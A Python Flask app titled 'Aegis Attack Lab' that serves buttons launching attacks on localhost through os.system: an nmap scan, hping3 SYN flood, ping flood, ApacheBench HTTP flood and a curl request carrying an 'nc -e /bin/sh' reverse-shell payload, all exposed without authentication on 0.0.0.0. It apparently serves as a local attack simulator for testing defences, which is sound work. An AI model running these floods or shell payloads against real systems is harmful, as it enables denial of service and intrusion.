from flask import Flask, render_template_string
import os
import threading

app = Flask(__name__)

HTML = """
<!DOCTYPE html>
<html>
<head>

<title>Aegis Attack Lab</title>

<style>

body{
background:black;
color:#00ff9c;
font-family:monospace;
text-align:center;
}

button{
background:#111;
color:#00ff9c;
border:1px solid #00ff9c;
padding:15px;
margin:10px;
font-size:18px;
cursor:pointer;
}

button:hover{
background:#00ff9c;
color:black;
}

</style>

</head>

<body>

<h1>⚔️ Aegis Cyber Attack Lab</h1>

<button onclick="fetch('/scan')">Port Scan</button>

<button onclick="fetch('/synflood')">SYN Flood</button>

<button onclick="fetch('/pingflood')">Ping Flood</button>

<button onclick="fetch('/httpflood')">HTTP Flood</button>

<button onclick="fetch('/payload')">Malicious Payload</button>

</body>
</html>
"""


@app.route("/")
def home():
    return render_template_string(HTML)


@app.route("/scan")
def scan():

    threading.Thread(target=lambda: os.system(
        "nmap -sS localhost"
    )).start()

    return "scan started"


@app.route("/synflood")
def synflood():

    threading.Thread(target=lambda: os.system(
        "sudo hping3 -S localhost -p 80 --flood"
    )).start()

    return "syn flood started"


@app.route("/pingflood")
def pingflood():

    threading.Thread(target=lambda: os.system(
        "ping -f localhost"
    )).start()

    return "ping flood started"


@app.route("/httpflood")
def httpflood():

    threading.Thread(target=lambda: os.system(
        "ab -n 1000 -c 100 http://localhost/"
    )).start()

    return "http flood started"


@app.route("/payload")
def payload():

    threading.Thread(target=lambda: os.system(
        "curl 'http://localhost/?cmd=nc -e /bin/sh'"
    )).start()

    return "payload attack started"


if __name__ == "__main__":

    print("Attack simulator running on port 7300")

    app.run(
        host="0.0.0.0",
        port=7300
    )
